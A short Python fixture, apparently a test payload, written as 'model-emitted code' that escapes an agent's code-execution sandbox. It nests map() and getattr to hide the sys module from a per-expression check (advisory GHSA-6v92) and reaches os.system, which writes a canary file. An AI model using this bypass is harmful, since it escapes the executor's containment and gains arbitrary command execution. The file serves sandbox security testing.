# Model-emitted code. getattr is applied by map() inside a builtin, so the executor's
# per-expression module check never sees the forbidden `sys` module (GHSA-6v92). The
# sys.modules dict, the os module and os.system stay inside lists/map objects, so no
# forbidden value is ever the result of an evaluated expression.
import warnings
mods = list(map(getattr, list(map(getattr, [warnings], ["sys"])), ["modules"]))[0]
system_in_list = list(map(getattr, list(map(mods.get, ["os"])), ["system"]))
list(map(list, map(map, system_in_list, [["echo {{NONCE}} > /tmp/pitsense_canary"]])))
